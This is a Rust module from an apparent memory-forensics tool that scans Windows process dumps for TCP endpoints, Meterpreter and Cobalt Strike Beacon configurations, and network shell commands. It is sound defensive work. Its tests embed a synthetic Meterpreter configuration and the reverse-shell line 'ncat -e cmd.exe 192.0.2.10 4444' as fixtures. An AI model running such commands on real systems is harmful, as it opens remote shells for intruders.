//! Attribute transport bytes in readable user VADs, independently of observed sockets.
use super::{
    NETWORK_ATTRIBUTION,
    application::{INVENTORY, MEMMAP, VADINFO},
    network, prepare,
    process_memory::{DumpScope, Region, number, regions, scan_windows},
    table,
};
use crate::{
    artifacts::OperatingSystem,
    case::{CaseSnapshot, Evidence, Run, RunStatus},
    results::ResultStore,
    volatility::{Installation, Record, Table},
};
use serde_json::json;
use sha2::{Digest, Sha256};
use std::{
    collections::{BTreeMap, BTreeSet},
    io::{Seek, SeekFrom},
    path::Path,
    sync::{
        OnceLock,
        atomic::{AtomicBool, Ordering},
    },
};

pub const PENDING: &str = "Waiting to prepare network process attribution";
pub const VERSION: &str = "network-process-v2-program-parsers";
pub const DISCOVERY: &str = "windows.vadregexscan.VadRegExScan";
fn pattern() -> &'static str {
    static PATTERN: OnceLock<String> = OnceLock::new();
    PATTERN.get_or_init(|| {
        format!(
            r"(?i)(?:tcp://|t\x00c\x00p\x00:\x00/\x00/\x00|\x00t\x00c\x00p\x00:\x00/\x00/|{}|{})",
            network::commands::discovery_pattern(),
            network::beacon::discovery_pattern()
        )
    })
}
pub const HELP: &str = "Find TCP transport endpoints, supported connection commands, Meterpreter TCP configurations and stock Cobalt Strike Beacon HTTP(S) configurations in readable user process memory, including images and read-only regions. Reuses compatible process dumps. With no options, VAD marker discovery selects candidate processes before collecting missing dumps. Optional --pid <PID> scans one process directly. Command syntax covers Ncat/netcat, socat, PowerShell/.NET, Python socket and Bash redirections. Findings establish bytes in an address space, not successful connections or exclusive ownership. Discovery can miss unreadable processes, encrypted/obfuscated data and processes absent from PsList. Collection failures and byte limits are reported. Browser and Process Memory keep their own scope.";
const MAX_PROCESSES: usize = 256;
const MAX_FINDINGS: usize = 20_000;
const MAX_PROCESS_BYTES: u64 = 1024 * 1024 * 1024;
const MAX_TOTAL_BYTES: u64 = 4 * MAX_PROCESS_BYTES;

#[derive(Default)]
struct Options {
    pid: Option<u64>,
    discovery: Option<String>,
    inventory: Vec<String>,
    sources: Vec<String>,
}
fn options(args: &[String]) -> Result<Options, String> {
    if !args.len().is_multiple_of(2) {
        return Err("Attribution options require values".into());
    }
    let mut opts = Options::default();
    for pair in args.chunks_exact(2) {
        match pair[0].as_str() {
            "--pid" if opts.pid.is_none() => {
                opts.pid = Some(
                    pair[1]
                        .parse::<u64>()
                        .ok()
                        .filter(|p| *p > 0)
                        .ok_or("--pid requires a positive process ID")?,
                )
            }
            "--discovery-run" if opts.discovery.is_none() => opts.discovery = Some(pair[1].clone()),
            "--inventory-run" => opts.inventory.push(pair[1].clone()),
            "--source-run" => opts.sources.push(pair[1].clone()),
            _ => {
                return Err(format!(
                    "Unknown or repeated attribution option: {}",
                    pair[0]
                ));
            }
        }
    }
    Ok(opts)
}
pub fn validate(args: &[String]) -> Result<(), String> {
    options(args).map(|_| ())
}
pub fn user_arguments(args: &[String]) -> Result<Vec<String>, String> {
    let opts = options(args)?;
    Ok(opts
        .pid
        .map(|pid| vec!["--pid".into(), pid.to_string()])
        .unwrap_or_default())
}
fn cancelled(cancel: &AtomicBool) -> Result<(), String> {
    if cancel.load(Ordering::Relaxed) {
        Err("Network process attribution cancelled".into())
    } else {
        Ok(())
    }
}
fn source<'a>(doc: &'a CaseSnapshot, id: &str, evidence: &str) -> Result<&'a Run, String> {
    doc.runs
        .iter()
        .find(|r| r.id == id && r.evidence_id == evidence && r.status == RunStatus::Completed)
        .ok_or_else(|| {
            format!("Attribution source {id} did not complete successfully for this evidence")
        })
}
fn discovery_arguments(pid: Option<u64>) -> Vec<String> {
    let mut args = vec!["--pattern".into(), pattern().into()];
    if let Some(pid) = pid {
        args.extend(["--pid".into(), pid.to_string()]);
    }
    args
}

fn input_fingerprint(doc: &CaseSnapshot, evidence: &str) -> String {
    let mut hash = Sha256::new();
    for run in doc.runs.iter().filter(|r| {
        r.evidence_id == evidence
            && r.status == RunStatus::Completed
            && (INVENTORY.contains(&r.plugin.as_str())
                || matches!(r.plugin.as_str(), MEMMAP | VADINFO | DISCOVERY))
    }) {
        hash.update(run.id.as_bytes());
        hash.update([0]);
    }
    format!("{:x}", hash.finalize())
}
pub fn needs_recovery(doc: &CaseSnapshot, evidence: &str) -> bool {
    let signature = format!("Inputs: {}", input_fingerprint(doc, evidence));
    !doc.runs.iter().any(|r| {
        r.evidence_id == evidence
            && r.plugin == NETWORK_ATTRIBUTION
            && (matches!(r.status, RunStatus::Queued | RunStatus::Running)
                || r.status == RunStatus::Completed
                    && user_arguments(&r.arguments) == Ok(vec![])
                    && r.message.contains(VERSION)
                    && r.message.contains(&signature))
    })
}
/// Resolve only a pinned, compatible process dump, never an arbitrary result path.
pub fn dump_target(
    directory: &Path,
    doc: &CaseSnapshot,
    row: &Record,
) -> Option<(std::path::PathBuf, u64)> {
    if row.text("Source type") != "Process virtual memory" {
        return None;
    }
    let pid = number(row, "PID")?;
    let source = doc.runs.iter().find(|r| {
        r.id == row.text("Source run")
            && r.plugin == MEMMAP
            && r.status == RunStatus::Completed
            && DumpScope::from_arguments(&r.arguments, pid).is_some()
    })?;
    doc.evidence
        .iter()
        .find(|e| e.id == source.evidence_id && e.sha256 == row.text("Evidence SHA-256"))?;
    let path = directory
        .join("analyses")
        .join(&source.id)
        .join(format!("pid.{pid}.dmp"));
    crate::object_store::exists(&path).then_some((path, number(row, "Dump offset")?))
}

/// Expand twice when discovery is needed, preserving the report's identity in the queue.
pub fn recovery_runs(
    directory: &Path,
    doc: &CaseSnapshot,
    evidence: &Evidence,
    engine: &Installation,
    args: &[String],
    cancel: &AtomicBool,
) -> Result<Vec<Run>, String> {
    if evidence.operating_system != OperatingSystem::Windows {
        return Err("Network process attribution requires Windows evidence".into());
    }
    let opts = options(args)?;
    for plugin in [MEMMAP, VADINFO] {
        if !engine.plugins.iter().any(|p| p.id == plugin) {
            return Err(format!("Network process attribution requires {plugin}"));
        }
    }
    let inventory = INVENTORY
        .iter()
        .map(|plugin| {
            doc.runs
                .iter()
                .rev()
                .find(|r| {
                    r.evidence_id == evidence.id
                        && r.plugin == *plugin
                        && r.arguments.is_empty()
                        && r.status == RunStatus::Completed
                })
                .map(|r| r.id.clone())
                .ok_or_else(|| format!("Attribution requires a completed unfiltered {plugin}"))
        })
        .collect::<Result<Vec<_>, _>>()?;
    let store = ResultStore::at(directory);
    let processes = store.table(&inventory[0])?;
    let known: BTreeSet<_> = processes
        .rows
        .iter()
        .filter_map(|r| number(r, "PID"))
        .collect();
    let mut pinned = user_arguments(args)?;
    let mut runs = Vec::new();
    let pids = if let Some(pid) = opts.pid {
        if !known.contains(&pid) {
            return Err(
                "The requested PID was not found in the collected process inventory".into(),
            );
        }
        BTreeSet::from([pid])
    } else {
        if !engine.plugins.iter().any(|p| p.id == DISCOVERY) {
            return Err("Choose --pid for this engine; broad attribution requires windows.vadregexscan.VadRegExScan".into());
        }
        let expected = discovery_arguments(None);
        let discovery = if let Some(id) = &opts.discovery {
            Some(source(doc, id, &evidence.id)?)
        } else {
            doc.runs.iter().rev().find(|r| {
                r.evidence_id == evidence.id
                    && r.plugin == DISCOVERY
                    && r.arguments == expected
                    && r.status == RunStatus::Completed
            })
        };
        let Some(discovery) = discovery else {
            let scan =
                engine.prepare(evidence, DISCOVERY, expected, &directory.join("analyses"))?;
            pinned.extend(["--discovery-run".into(), scan.id.clone()]);
            runs.push(scan);
            let mut parser = prepare(evidence, NETWORK_ATTRIBUTION, pinned)?;
            parser.message = PENDING.into();
            runs.push(parser);
            return Ok(runs);
        };
        if discovery.plugin != DISCOVERY || discovery.arguments != expected {
            return Err("Incompatible attribution discovery source".into());
        }
        pinned.extend(["--discovery-run".into(), discovery.id.clone()]);
        store
            .table(&discovery.id)?
            .rows
            .iter()
            .filter_map(|r| number(r, "PID"))
            .filter(|p| known.contains(p))
            .collect()
    };
    if pids.len() > MAX_PROCESSES {
        return Err("More than 256 candidate processes; choose --pid".into());
    }
    for id in inventory {
        pinned.extend(["--inventory-run".into(), id]);
    }
    for pid in pids {
        for (plugin, collection) in [
            (VADINFO, vec!["--pid".into(), pid.to_string()]),
            (
                MEMMAP,
                if engine.user_memory_dumps {
                    DumpScope::User
                } else {
                    DumpScope::Full
                }
                .arguments(pid),
            ),
        ] {
            cancelled(cancel)?;
            let reusable = doc.runs.iter().rev().find(|r| {
                r.evidence_id == evidence.id
                    && r.plugin == plugin
                    && r.status == RunStatus::Completed
                    && if plugin == MEMMAP {
                        DumpScope::from_arguments(&r.arguments, pid).is_some()
                            && crate::object_store::exists(
                                &directory
                                    .join("analyses")
                                    .join(&r.id)
                                    .join(format!("pid.{pid}.dmp")),
                            )
                    } else {
                        r.arguments == collection
                    }
            });
            let id = if let Some(reused) = reusable {
                reused.id.clone()
            } else {
                let run =
                    engine.prepare(evidence, plugin, collection, &directory.join("analyses"))?;
                let id = run.id.clone();
                runs.push(run);
                id
            };
            pinned.extend(["--source-run".into(), id]);
        }
    }
    runs.push(prepare(evidence, NETWORK_ATTRIBUTION, pinned)?);
    Ok(runs)
}

fn markers() -> &'static regex::bytes::Regex {
    static RE: OnceLock<regex::bytes::Regex> = OnceLock::new();
    RE.get_or_init(|| {
        regex::bytes::Regex::new(r"(?i-u)(?:tcp://|t\x00c\x00p\x00:\x00/\x00/\x00)").unwrap()
    })
}
fn endpoints(bytes: &[u8], window: Region, core: std::ops::Range<usize>) -> Vec<Record> {
    let mut rows = Vec::new();
    for hit in markers()
        .find_iter(bytes)
        .filter(|m| core.contains(&m.start()))
    {
        let at = hit.start();
        let encoding = if bytes[at] == 0 {
            "UTF-16BE"
        } else if bytes.get(at + 1) == Some(&0) {
            "UTF-16LE"
        } else {
            "UTF-8"
        };
        let step = if encoding == "UTF-8" { 1 } else { 2 };
        let units = bytes[at..]
            .chunks_exact(step)
            .take(128)
            .map(|b| match encoding {
                "UTF-16BE" => u16::from_be_bytes([b[0], b[1]]),
                "UTF-16LE" => u16::from_le_bytes([b[0], b[1]]),
                _ => u16::from(b[0]),
            });
        let text: String = units
            .take_while(|u| *u >= 33 && *u <= 126)
            .filter_map(|u| char::from_u32(u.into()))
            .collect();
        let Some(mut row) = network::parse_text(&text)
            .into_iter()
            .find(|r| r.text("Finding") == "TCP transport endpoint")
        else {
            continue;
        };
        let uri = row.text("URI");
        let config = if encoding == "UTF-16LE" {
            network::memory::meterpreter_config(bytes, at, &uri)
        } else {
            None
        };
        row.fields.insert(
            "Finding".into(),
            if config.is_some() {
                "Process memory Meterpreter TCP configuration"
            } else {
                "Process memory TCP endpoint"
            }
            .into(),
        );
        row.fields.insert(
            "Virtual address".into(),
            format!("{:#x}", window.virtual_start + at as u64).into(),
        );
        row.fields
            .insert("Dump offset".into(), (window.file + at as u64).into());
        row.fields
            .insert("Byte length".into(), (uri.len() * step).into());
        row.fields.insert("Encoding".into(), encoding.into());
        // ASCII UTF-16 has an indistinguishable shifted BE reading. Keep its
        // coordinates without letting it hide LE configuration validation.
        if encoding == "UTF-16LE" && at > 0 && bytes[at - 1] == 0 {
            row.fields.insert("Alternate decodings".into(),json!([{
                "Encoding":"UTF-16BE", "Virtual address":format!("{:#x}",window.virtual_start+at as u64-1),
                "Dump offset":window.file+at as u64-1
            }]));
        }
        if let Some(config) = config {
            for key in ["Payload UUID", "Session GUID"] {
                row.fields.insert(key.into(), config[key].clone());
            }
            row.fields.insert("Payload configuration".into(), config);
            row.fields.insert(
                "Configuration virtual address".into(),
                format!("{:#x}", window.virtual_start + at as u64 - 48).into(),
            );
            row.fields.insert(
                "Configuration bytes SHA-256".into(),
                format!("{:x}", Sha256::digest(&bytes[at - 48..at + 1038])).into(),
            );
            row.fields.insert(
                "Validation".into(),
                "Complete legacy session and TCP transport layout in virtual memory".into(),
            );
        }
        rows.push(row);
    }
    for (at, mut row) in network::beacon::scan(bytes, core.clone()) {
        row.fields.insert(
            "Finding".into(),
            "Process memory Cobalt Strike Beacon configuration".into(),
        );
        row.fields.insert(
            "Virtual address".into(),
            format!("{:#x}", window.virtual_start + at as u64).into(),
        );
        row.fields.insert(
            "Configuration virtual address".into(),
            format!("{:#x}", window.virtual_start + at as u64).into(),
        );
        row.fields
            .insert("Dump offset".into(), (window.file + at as u64).into());
        row.fields.insert(
            "Byte length".into(),
            row.fields["Configuration byte length"].clone(),
        );
        row.fields
            .insert("Encoding".into(), "Binary TLV with recorded XOR key".into());
        rows.push(row);
    }
    for (at, length, encoding, mut row) in network::commands::scan_text(bytes, core) {
        row.fields.insert(
            "Virtual address".into(),
            format!("{:#x}", window.virtual_start + at as u64).into(),
        );
        row.fields
            .insert("Dump offset".into(), (window.file + at as u64).into());
        row.fields.insert("Byte length".into(), length.into());
        row.fields.insert("Encoding".into(), encoding.into());
        row.fields.insert(
            "Address meaning".into(),
            "Start of the recovered command text span".into(),
        );
        rows.push(row);
    }
    rows
}

pub fn analyze(
    directory: &Path,
    doc: &CaseSnapshot,
    run: &Run,
    cancel: &AtomicBool,
    progress: &impl Fn(String),
) -> Result<(Table, String), String> {
    cancelled(cancel)?;
    let opts = options(&run.arguments)?;
    if opts.inventory.len() != 2 {
        return Err(
            "Attribution requires pinned process inventories; prepare recovery first".into(),
        );
    }
    let store = ResultStore::at(directory);
    let mut identities = BTreeMap::new();
    for (i, id) in opts.inventory.iter().enumerate() {
        let inventory = source(doc, id, &run.evidence_id)?;
        if inventory.plugin != INVENTORY[i] || !inventory.arguments.is_empty() {
            return Err("Invalid attribution process inventory".into());
        }
        for row in store.table(id)?.rows {
            let Some(pid) = number(&row, "PID") else {
                continue;
            };
            if i == 0 {
                identities.insert(pid, row);
            } else if let Some(process) = identities.get_mut(&pid) {
                process
                    .fields
                    .insert("Command line".into(), row.text("Args").into());
            }
        }
    }
    let mut sources: BTreeMap<u64, BTreeMap<&str, &Run>> = BTreeMap::new();
    for id in &opts.sources {
        let r = source(doc, id, &run.evidence_id)?;
        let pid = r
            .arguments
            .windows(2)
            .find(|p| p[0] == "--pid")
            .and_then(|p| p[1].parse::<u64>().ok())
            .ok_or("Attribution source has no PID")?;
        if !identities.contains_key(&pid)
            || opts.pid.is_some_and(|p| p != pid)
            || !(r.plugin == MEMMAP && DumpScope::from_arguments(&r.arguments, pid).is_some()
                || r.plugin == VADINFO && r.arguments == ["--pid", &pid.to_string()])
        {
            return Err(
                "Attribution source does not match the requested process collection".into(),
            );
        }
        if sources
            .entry(pid)
            .or_default()
            .insert(&r.plugin, r)
            .is_some()
        {
            return Err("Duplicate attribution source".into());
        }
    }
    if sources.len() > MAX_PROCESSES {
        return Err("Attribution process limit exceeded".into());
    }
    if opts.pid.is_some() && sources.is_empty() {
        return Err("Missing pinned sources for the selected PID".into());
    }
    if let Some(id) = &opts.discovery {
        let discovery = source(doc, id, &run.evidence_id)?;
        if discovery.plugin != DISCOVERY || discovery.arguments != discovery_arguments(None) {
            return Err("Invalid attribution discovery source".into());
        }
    } else if opts.pid.is_none() {
        return Err("Broad attribution requires a pinned discovery source".into());
    }
    let mut rows = Vec::new();
    let mut diagnostics = Vec::new();
    let mut total = 0;
    let mut parsed = 0;
    let mut limited = false;
    let evidence = doc
        .evidence
        .iter()
        .find(|e| e.id == run.evidence_id)
        .ok_or("Missing evidence")?;
    for (pid, inputs) in sources {
        cancelled(cancel)?;
        progress(format!(
            "Network process attribution: PID {pid}, {} findings",
            rows.len()
        ));
        let result = (|| {
            let map = inputs.get(MEMMAP).ok_or("Missing pinned process mapping")?;
            let vad = inputs
                .get(VADINFO)
                .ok_or("Missing pinned process VAD inventory")?;
            let path = directory
                .join("analyses")
                .join(&map.id)
                .join(format!("pid.{pid}.dmp"));
            let mut file = crate::extracted_files::open_artifact(&path)?;
            let size = file.seek(SeekFrom::End(0)).map_err(|e| e.to_string())?;
            let (mappings, rejected) = regions(
                store.table(&map.id)?,
                &format!("pid.{pid}.dmp"),
                size,
                DumpScope::from_arguments(&map.arguments, pid).ok_or("Invalid dump scope")?,
            )?;
            if rejected > 0 {
                diagnostics.push(format!("PID {pid}: rejected {rejected} invalid mappings"));
            }
            let vad_table = store.table(&vad.id)?;
            let mut readable = Vec::new();
            for region in &vad_table.rows {
                if number(region, "PID") != Some(pid)
                    || region.text("Protection").contains("NOACCESS")
                    || region.text("Protection").contains("GUARD")
                {
                    continue;
                }
                let (Some(start), Some(end)) = (
                    number(region, "Start VPN"),
                    number(region, "End VPN").and_then(|v| v.checked_add(1)),
                ) else {
                    continue;
                };
                for mapping in &mappings {
                    let first = start.max(mapping.virtual_start);
                    let last = end.min(mapping.virtual_start + mapping.length);
                    if first < last {
                        readable.push((
                            Region {
                                file: mapping.file + first - mapping.virtual_start,
                                virtual_start: first,
                                length: last - first,
                            },
                            region,
                        ));
                    }
                }
            }
            readable.sort_by_key(|(r, _)| r.virtual_start);
            if readable
                .windows(2)
                .any(|p| p[0].0.virtual_start + p[0].0.length > p[1].0.virtual_start)
            {
                return Err("Overlapping readable process VADs".into());
            }
            let identity = &identities[&pid];
            if readable.is_empty() {
                return Err("No readable user VAD ranges in the process dump".into());
            }
            let mut process_bytes = 0;
            let mut seen = BTreeSet::new();
            for (range, region) in readable {
                let budget = MAX_PROCESS_BYTES
                    .saturating_sub(process_bytes)
                    .min(MAX_TOTAL_BYTES.saturating_sub(total));
                let (scanned, hit_limit) = scan_windows(
                    &mut file,
                    &[range],
                    cancel,
                    budget,
                    |bytes, window, core| {
                        for mut row in endpoints(bytes, window, core) {
                            let key = [
                                "Virtual address",
                                "Program",
                                "Finding",
                                "IP",
                                "Hostname",
                                "Port",
                            ]
                            .map(|field| row.text(field));
                            if !seen.insert(key) {
                                continue;
                            }
                            if rows.len() >= MAX_FINDINGS {
                                return false;
                            }
                            for (key, value) in [
                                ("PID", json!(pid)),
                                ("Process", json!(identity.text("ImageFileName"))),
                                ("CreateTime", json!(identity.text("CreateTime"))),
                                ("Process object", json!(identity.text("Offset(V)"))),
                                ("Command line", json!(identity.text("Command line"))),
                                ("Source run", json!(map.id)),
                                ("Region run", json!(vad.id)),
                                ("Inventory runs", json!(opts.inventory)),
                                ("Evidence SHA-256", json!(evidence.sha256)),
                                ("Parser version", json!(VERSION)),
                                ("Source type", json!("Process virtual memory")),
                                (
                                    "Source file",
                                    json!(
                                        path.strip_prefix(directory)
                                            .unwrap_or(&path)
                                            .display()
                                            .to_string()
                                    ),
                                ),
                                (
                                    "VAD start",
                                    json!(format!(
                                        "{:#x}",
                                        number(region, "Start VPN").unwrap_or(0)
                                    )),
                                ),
                                (
                                    "VAD end",
                                    json!(format!("{:#x}", number(region, "End VPN").unwrap_or(0))),
                                ),
                                ("Protection", json!(region.text("Protection"))),
                                ("Mapped file", json!(region.text("File"))),
                                (
                                    "Private memory",
                                    region
                                        .fields
                                        .get("PrivateMemory")
                                        .cloned()
                                        .unwrap_or_default(),
                                ),
                                (
                                    "Ownership evidence",
                                    json!(
                                        "Exact endpoint bytes in this process address space; shared mappings may have other owners"
                                    ),
                                ),
                                (
                                    "Connection evidence",
                                    json!("No successful connection established by process memory"),
                                ),
                                (
                                    "Interpretation",
                                    json!(
                                        "Endpoint or configuration present in readable user process memory. It may be copied, unused or historical; socket activity and execution require separate evidence."
                                    ),
                                ),
                            ] {
                                row.fields.insert(key.into(), value);
                            }
                            rows.push(row);
                        }
                        rows.len() < MAX_FINDINGS
                    },
                )?;
                total += scanned;
                process_bytes += scanned;
                limited |= hit_limit;
                if limited {
                    break;
                }
            }
            Ok::<_, String>(())
        })();
        match result {
            Ok(()) => parsed += 1,
            Err(error) => {
                cancelled(cancel)?;
                diagnostics.push(format!("PID {pid}: {error}"));
            }
        }
        if limited {
            break;
        }
    }
    let scope = if opts.pid.is_some() {
        "Selected PID"
    } else {
        "Program marker VAD discovery candidates; unreadable processes and processes absent from PsList are not covered"
    };
    let mut inputs = doc.clone();
    if let Some(i) = inputs.runs.iter().position(|r| r.id == run.id) {
        inputs.runs.truncate(i);
    }
    let message = format!(
        "{} process-memory network findings; {parsed} processes scanned; {total} bytes. {scope}. {}Parser: {VERSION}. Inputs: {}. Process associations do not establish successful connections. {}",
        rows.len(),
        if limited {
            "Stopped at the byte or finding limit. "
        } else {
            ""
        },
        input_fingerprint(&inputs, &run.evidence_id),
        diagnostics.join("\n")
    );
    Ok((table(rows), message))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{
        case::Case,
        settings::Settings,
        volatility::{Outcome, Plugin},
    };
    use std::{fs, io::Cursor};

    fn configuration() -> Vec<u8> {
        let mut bytes = vec![0; 1086];
        bytes[8..12].copy_from_slice(&0x56a2b5f0u32.to_le_bytes());
        bytes[12..16].copy_from_slice(&604800u32.to_le_bytes());
        bytes[16..32].fill(0x11);
        let url: Vec<_> = "tcp://192.0.2.5:5059"
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect();
        bytes[48..48 + url.len()].copy_from_slice(&url);
        for (i, value) in [300u32, 3600, 10].into_iter().enumerate() {
            bytes[1072 + i * 4..1076 + i * 4].copy_from_slice(&value.to_le_bytes());
        }
        bytes
    }
    #[test]
    fn configuration_across_scan_windows_is_validated_once_with_both_decodings() {
        let at = 1024 * 1024 - 64;
        let config = configuration();
        let mut bytes = vec![0xff; at];
        bytes.extend(&config);
        let mut rows = Vec::new();
        let length = bytes.len() as u64;
        scan_windows(
            &mut Cursor::new(bytes),
            &[Region {
                file: 0,
                virtual_start: 0x1000,
                length,
            }],
            &AtomicBool::new(false),
            u64::MAX,
            |bytes, window, core| {
                rows.extend(endpoints(bytes, window, core));
                true
            },
        )
        .unwrap();
        assert_eq!(rows.len(), 1);
        let row = &rows[0];
        assert_eq!(
            row.text("Finding"),
            "Process memory Meterpreter TCP configuration"
        );
        assert_eq!(
            row.text("Virtual address"),
            format!("{:#x}", 0x1000 + at + 48)
        );
        assert_eq!(
            row.text("Configuration bytes SHA-256"),
            format!("{:x}", Sha256::digest(&config))
        );
        assert!(row.fields.contains_key("Alternate decodings"));
    }
    #[test]
    fn virtual_gaps_do_not_join_endpoints_and_cancellation_is_checked() {
        let bytes = b"tcp://192.0.2.5:5059".to_vec();
        let mut rows = Vec::new();
        let ranges = [
            Region {
                file: 0,
                virtual_start: 0x1000,
                length: 4,
            },
            Region {
                file: 4,
                virtual_start: 0x3000,
                length: (bytes.len() - 4) as u64,
            },
        ];
        scan_windows(
            &mut Cursor::new(&bytes),
            &ranges,
            &AtomicBool::new(false),
            u64::MAX,
            |bytes, window, core| {
                rows.extend(endpoints(bytes, window, core));
                true
            },
        )
        .unwrap();
        assert!(rows.is_empty());
        assert!(
            scan_windows(
                &mut Cursor::new(&bytes),
                &ranges,
                &AtomicBool::new(true),
                u64::MAX,
                |_, _, _| true
            )
            .is_err()
        );
        let (scanned, limited) = scan_windows(
            &mut Cursor::new(&bytes),
            &ranges,
            &AtomicBool::new(false),
            2,
            |_, _, _| true,
        )
        .unwrap();
        assert_eq!(scanned, 2);
        assert!(limited);
    }
    #[test]
    fn tcp_endpoints_support_ascii_ipv6_and_shifted_big_endian_without_duplicate_rows() {
        let text = "TCP://[2001:db8::5]:443";
        let mut bytes = text.as_bytes().to_vec();
        bytes.push(0);
        bytes.extend(text.encode_utf16().flat_map(u16::to_be_bytes));
        bytes.extend([0, 0]);
        let rows = endpoints(
            &bytes,
            Region {
                file: 10,
                virtual_start: 0x1000,
                length: bytes.len() as u64,
            },
            0..bytes.len(),
        );
        assert_eq!(rows.len(), 2);
        assert!(
            rows.iter().all(|r| r.text("IP") == "2001:db8::5"
                && r.text("Finding") == "Process memory TCP endpoint")
        );
        assert_eq!(rows[0].text("Encoding"), "UTF-8");
        assert!(rows[1].fields.contains_key("Alternate decodings"));
    }
    #[test]
    fn beacon_and_program_text_use_virtual_windows_without_inventing_connections() {
        let at = 1024 * 1024 - 12;
        let mut bytes = vec![0xff; at];
        bytes.extend(network::beacon::tests::fixture(0x2e));
        bytes.extend(b"\0ncat -e cmd.exe 192.0.2.10 4444\0");
        let mut rows = Vec::new();
        let length = bytes.len() as u64;
        scan_windows(
            &mut Cursor::new(bytes),
            &[Region {
                file: 0,
                virtual_start: 0x1000,
                length,
            }],
            &AtomicBool::new(false),
            u64::MAX,
            |bytes, window, core| {
                rows.extend(endpoints(bytes, window, core));
                true
            },
        )
        .unwrap();
        assert_eq!(
            rows.iter()
                .filter(|r| r.text("Program") == network::beacon::FAMILY)
                .count(),
            2
        );
        assert!(
            rows.iter()
                .any(|r| r.text("Program") == "Ncat/netcat" && r.text("IP") == "192.0.2.10")
        );
        assert!(regex::bytes::Regex::new(pattern()).is_ok());
    }
    fn completed(
        case: &mut Case,
        evidence: &Evidence,
        plugin: &str,
        args: Vec<String>,
        value: serde_json::Value,
    ) -> Run {
        let mut run = prepare(evidence, NETWORK_ATTRIBUTION, vec![]).unwrap();
        run.plugin = plugin.into();
        run.arguments = args;
        case.queue(run.clone()).unwrap();
        case.finish(
            &run.id,
            &Outcome {
                status: RunStatus::Completed,
                exit_code: Some(0),
                message: String::new(),
                table: Some(Table::parse(&value.to_string()).unwrap()),
            },
        )
        .unwrap();
        case.document
            .runs
            .iter()
            .find(|r| r.id == run.id)
            .unwrap()
            .clone()
    }
    #[test]
    fn image_configuration_reuses_dump_and_keeps_exact_source_identity() {
        let temp = tempfile::tempdir().unwrap();
        let image = temp.path().join("capture.raw");
        fs::write(&image, b"fixture").unwrap();
        let mut evidence = Evidence::inspect(&image, &AtomicBool::new(false), |_, _| {}).unwrap();
        evidence.operating_system = OperatingSystem::Windows;
        let mut case = Case::create(&temp.path().join("case"), "Attribution").unwrap();
        case.add_evidence(evidence.clone()).unwrap();
        completed(
            &mut case,
            &evidence,
            INVENTORY[0],
            vec![],
            json!([{"PID":42,"ImageFileName":"sample.exe","CreateTime":"2023-09-14T02:00:00Z","Offset(V)":"0x1234"}]),
        );
        completed(
            &mut case,
            &evidence,
            INVENTORY[1],
            vec![],
            json!([{"PID":42,"Args":"sample.exe"}]),
        );
        let vad = completed(
            &mut case,
            &evidence,
            VADINFO,
            vec!["--pid".into(), "42".into()],
            json!([{"PID":42,"Start VPN":0x140000000u64,"End VPN":0x140001fffu64,"PrivateMemory":0,"Protection":"PAGE_READONLY","File":"sample.exe"}]),
        );
        let map = completed(
            &mut case,
            &evidence,
            MEMMAP,
            DumpScope::Full.arguments(42),
            json!([
                {"Virtual":0x140000000u64,"Physical":0x9000,"Size":4096,"Offset in File":0,"File output":"pid.42.dmp"},
                {"Virtual":0x140001000u64,"Physical":0xf000,"Size":4096,"Offset in File":4096,"File output":"pid.42.dmp"}
            ]),
        );
        let path = case
            .directory
            .join("analyses")
            .join(&map.id)
            .join("pid.42.dmp");
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        let mut dump = vec![0; 8192];
        let config = configuration();
        dump[4000..4000 + config.len()].copy_from_slice(&config);
        fs::write(&path, &dump).unwrap();
        let engine = Installation {
            settings: Settings::default(),
            version: "fixture".into(),
            plugins: [MEMMAP, VADINFO]
                .map(|id| Plugin {
                    id: id.into(),
                    description: String::new(),
                })
                .into(),
            user_memory_dumps: true,
        };
        let runs = recovery_runs(
            &case.directory,
            &case.document,
            &evidence,
            &engine,
            &["--pid".into(), "42".into()],
            &AtomicBool::new(false),
        )
        .unwrap();
        assert_eq!(runs.len(), 1);
        let run = &runs[0];
        let (result, message) = analyze(
            &case.directory,
            &case.document,
            run,
            &AtomicBool::new(false),
            &|_| {},
        )
        .unwrap();
        assert_eq!(result.rows.len(), 1);
        let row = &result.rows[0];
        assert_eq!(
            row.text("Finding"),
            "Process memory Meterpreter TCP configuration"
        );
        assert_eq!(row.text("Mapped file"), "sample.exe");
        assert_eq!(row.text("Process"), "sample.exe");
        assert_eq!(row.text("CreateTime"), "2023-09-14T02:00:00Z");
        assert_eq!(row.text("Source run"), map.id);
        assert_eq!(row.text("Region run"), vad.id);
        assert!(row.text("Connection evidence").contains("No successful"));
        assert!(message.contains("1 processes scanned"));
        assert!(!row.fields.contains_key("Acquisition offset"));
        assert_eq!(
            dump_target(&case.directory, &case.document, row),
            Some((path, 4048))
        );
        let mut completed = run.clone();
        completed.status = RunStatus::Completed;
        completed.message = message;
        case.document.runs.push(completed);
        // A selected PID is not evidence of broad discovery coverage.
        assert!(needs_recovery(&case.document, &evidence.id));
        let mut invalid = run.clone();
        invalid.arguments.extend(["--source-run".into(), map.id]);
        assert!(
            analyze(
                &case.directory,
                &case.document,
                &invalid,
                &AtomicBool::new(false),
                &|_| {}
            )
            .is_err()
        );
    }

    #[test]
    fn broad_discovery_empty_results_and_new_input_freshness_are_explicit() {
        let temp = tempfile::tempdir().unwrap();
        let image = temp.path().join("capture.raw");
        fs::write(&image, b"fixture").unwrap();
        let mut evidence = Evidence::inspect(&image, &AtomicBool::new(false), |_, _| {}).unwrap();
        evidence.operating_system = OperatingSystem::Windows;
        let mut case = Case::create(&temp.path().join("case"), "Discovery").unwrap();
        case.add_evidence(evidence.clone()).unwrap();
        for id in INVENTORY {
            completed(
                &mut case,
                &evidence,
                id,
                vec![],
                json!([{"PID":42,"ImageFileName":"example.exe"}]),
            );
        }
        let engine = Installation {
            settings: Settings::default(),
            version: "fixture".into(),
            plugins: [MEMMAP, VADINFO, DISCOVERY]
                .map(|id| Plugin {
                    id: id.into(),
                    description: String::new(),
                })
                .into(),
            user_memory_dumps: true,
        };
        let mut run = prepare(&evidence, NETWORK_ATTRIBUTION, vec![]).unwrap();
        run.message = PENDING.into();
        let id = run.id.clone();
        case.queue(run).unwrap();
        let first = crate::analyses::prepare_network_attribution(
            &case,
            &engine,
            &case.document.runs.last().unwrap().clone(),
        )
        .unwrap();
        assert_eq!(first.len(), 2);
        assert_eq!(first[0].plugin, DISCOVERY);
        assert_eq!(first[1].id, id);
        assert_eq!(first[1].message, PENDING);
